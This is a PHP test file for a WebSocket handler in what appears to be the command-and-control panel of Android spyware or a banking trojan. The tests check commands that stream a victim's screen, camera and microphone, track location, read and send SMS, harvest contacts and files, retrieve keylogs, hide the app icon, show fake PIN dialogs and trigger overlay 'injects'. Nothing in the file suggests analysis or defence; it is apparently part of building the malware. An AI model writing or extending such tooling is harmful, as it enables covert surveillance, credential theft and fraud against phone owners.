<?php

declare(strict_types=1);

use App\WebSocket\ConnectionManager;
use App\WebSocket\Handlers\PanelSendHandler;
use Swoole\WebSocket\Server as SwooleServer;

beforeEach(function () {
    config(['websocket.logging.enabled' => false]);

    $this->mockServer = Mockery::mock(SwooleServer::class);
    $this->mockServer->shouldReceive('isEstablished')->andReturn(true)->byDefault();
    $this->mockServer->shouldReceive('push')->andReturn(true)->byDefault();

    $this->connectionManager = Mockery::mock(ConnectionManager::class);
    $this->connectionManager->shouldReceive('getServer')->andReturn($this->mockServer)->byDefault();

    $this->handler = new PanelSendHandler($this->connectionManager);
});

afterEach(function () {
    Mockery::close();
});

describe('PanelSendHandler', function () {
    describe('handle()', function () {
        it('ignores messages without pid', function () {
            $this->connectionManager->shouldNotReceive('sendToDevice');

            $this->handler->handle(1, ['itype' => 'slr_panelsend', 'subc' => 'SMS']);

            expect(true)->toBeTrue();
        });
    });

    describe('screen commands', function () {
        it('sends screen share command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) use ($phoneId) {
                    return $pid === $phoneId
                        && $data['type'] === 'screencomd'
                        && $data['subc'] === 'screen'
                        && $data['screentype'] === 'SK';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'screen',
                'pid' => $phoneId,
                'screentype' => 'SK',
            ]);
        });
    });

    describe('camera commands', function () {
        it('sends camera on command with selected camera', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'cam'
                        && $data['SelectedCam'] === 'front';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'cam',
                'pid' => $phoneId,
                'SelectedCam' => 'front',
            ]);
        });

        it('sends camera off command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'camoff';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'camoff',
                'pid' => $phoneId,
            ]);
        });
    });

    describe('microphone commands', function () {
        it('sends mic on command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'mic';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'mic',
                'pid' => $phoneId,
            ]);
        });

        it('sends mic off command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'micoff';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'micoff',
                'pid' => $phoneId,
            ]);
        });
    });

    describe('location commands', function () {
        it('sends location on command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'loc';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'loc',
                'pid' => $phoneId,
            ]);
        });

        it('sends location off command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'locoff';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'locoff',
                'pid' => $phoneId,
            ]);
        });
    });

    describe('SMS commands', function () {
        it('sends SMS request command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'SMS';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'SMS',
                'pid' => $phoneId,
            ]);
        });

        it('sends SMS send command with number and message', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'SMSSEND'
                        && $data['smsnumber'] === '13800138000'
                        && $data['message'] === 'Hello World';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'SMSSEND',
                'pid' => $phoneId,
                'smsnumber' => '13800138000',
                'message' => 'Hello World',
            ]);
        });
    });

    describe('contacts commands', function () {
        it('sends contacts request command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'Contacts';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'Contacts',
                'pid' => $phoneId,
            ]);
        });
    });

    describe('files commands', function () {
        it('sends files list request with path', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'files'
                        && $data['filepath'] === '/sdcard/Download';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'files',
                'pid' => $phoneId,
                'filepath' => '/sdcard/Download',
            ]);
        });

        it('sends file delete command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'changefiles'
                        && $data['comdtype'] === 'R'
                        && $data['filepath'] === '/sdcard/test.txt';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'changefiles',
                'pid' => $phoneId,
                'comdtype' => 'R',
                'filepath' => '/sdcard/test.txt',
            ]);
        });

        it('sends file download command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'changefiles'
                        && $data['comdtype'] === 'D';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'changefiles',
                'pid' => $phoneId,
                'comdtype' => 'D',
                'filepath' => '/sdcard/test.txt',
            ]);
        });

        it('sends file upload in chunks', function () {
            $phoneId = 'test-device-123';
            $content = str_repeat('A', 256 * 1024 + 100); // 256KB + 100 bytes = 2 chunks

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['chunkIndex'] === 0 && $data['totalChunks'] === 2;
                })
                ->once();

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['chunkIndex'] === 1 && $data['totalChunks'] === 2;
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'changefiles',
                'pid' => $phoneId,
                'comdtype' => 'U',
                'filepath' => '/sdcard/upload.txt',
                'filename' => 'upload.txt',
                'content' => $content,
            ]);
        });
    });

    describe('keylog commands', function () {
        it('sends keylog request command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'Keylog'
                        && $data['keylogtype'] === '0';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'Keylog',
                'pid' => $phoneId,
                'keylogtype' => '0',
            ]);
        });

        it('sends keylog by date request', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'Logdate'
                        && $data['keylogdate'] === '2026-01-31';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'Logdate',
                'pid' => $phoneId,
                'keylogtype' => '0',
                'keylogdate' => '2026-01-31',
            ]);
        });
    });

    describe('apps commands', function () {
        it('sends load apps command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'LOADAPPS';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'LOADAPPS',
                'pid' => $phoneId,
            ]);
        });

        it('sends open app command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'OPENAPP'
                        && $data['packageName'] === 'com.android.chrome';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'OPENAPP',
                'pid' => $phoneId,
                'packageName' => 'com.android.chrome',
            ]);
        });

        it('sends uninstall app command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'UNINSTALLAPP'
                        && $data['packageName'] === 'com.example.app';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'UNINSTALLAPP',
                'pid' => $phoneId,
                'packageName' => 'com.example.app',
            ]);
        });
    });

    describe('activity records commands', function () {
        it('sends get activities command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'Activitys'
                        && $data['subc'] === 'GA';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'activz',
                'pid' => $phoneId,
                'action' => 'L',
            ]);
        });

        it('sends delete activities command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'Activitys'
                        && $data['subc'] === 'DA';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'activz',
                'pid' => $phoneId,
                'action' => 'D',
            ]);
        });

        it('sends get notifications command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'Activitys'
                        && $data['subc'] === 'GF';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'notifys',
                'pid' => $phoneId,
                'action' => 'L',
            ]);
        });

        it('sends get visited apps command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'Activitys'
                        && $data['subc'] === 'GV';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'vapps',
                'pid' => $phoneId,
                'action' => 'L',
            ]);
        });

        it('sends get visited links command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'Activitys'
                        && $data['subc'] === 'GU';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'vlinks',
                'pid' => $phoneId,
                'action' => 'L',
            ]);
        });
    });

    describe('permissions commands', function () {
        it('sends permission request command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'Permissions'
                        && $data['subc'] === 'R'
                        && $data['prim'] === 'CAMERA';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'Permissions',
                'pid' => $phoneId,
                'action' => 'R',
                'prim' => 'CAMERA',
            ]);
        });
    });

    describe('device management commands', function () {
        it('sends rename command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'rename'
                        && $data['nam'] === 'New Device Name';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'rename',
                'pid' => $phoneId,
                'nam' => 'New Device Name',
            ]);
        });

        it('sends delete command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'Delete'
                        && $data['subc'] === '[reme]';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'delete',
                'pid' => $phoneId,
            ]);
        });

        it('sends hide icon command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'Hideico';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'Hideico',
                'pid' => $phoneId,
            ]);
        });

        it('sends notify command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'Notifi'
                        && $data['noti'] === 'test-notification';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'Notify',
                'pid' => $phoneId,
                'noti' => 'test-notification',
            ]);
        });
    });

    describe('dialog commands', function () {
        it('sends dialog command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'DIAO'
                        && $data['pin'] === '1234'
                        && $data['title'] === 'Enter PIN';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'DIAO',
                'pid' => $phoneId,
                'pin' => '1234',
                'title' => 'Enter PIN',
                'lckdis' => '1',
                'typ' => 'pin',
            ]);
        });
    });

    describe('inject commands', function () {
        it('sends open inject command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'OPENINJ';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'OPENINJ',
                'pid' => $phoneId,
            ]);
        });

        it('sends no inject command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'noinj'
                        && $data['jctid'] === 'inject-123';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'noinj',
                'pid' => $phoneId,
                'jctid' => 'inject-123',
            ]);
        });
    });

    describe('display commands', function () {
        it('sends display command', function () {
            $phoneId = 'test-device-123';

            $this->connectionManager->shouldReceive('sendToDevice')
                ->withArgs(function ($pid, $data) {
                    return $data['type'] === 'screencomd'
                        && $data['subc'] === 'display'
                        && $data['display'] === '1';
                })
                ->once();

            $this->handler->handle(1, [
                'itype' => 'slr_panelsend',
                'subc' => 'display',
                'pid' => $phoneId,
                'display' => '1',
            ]);
        });
    });
});
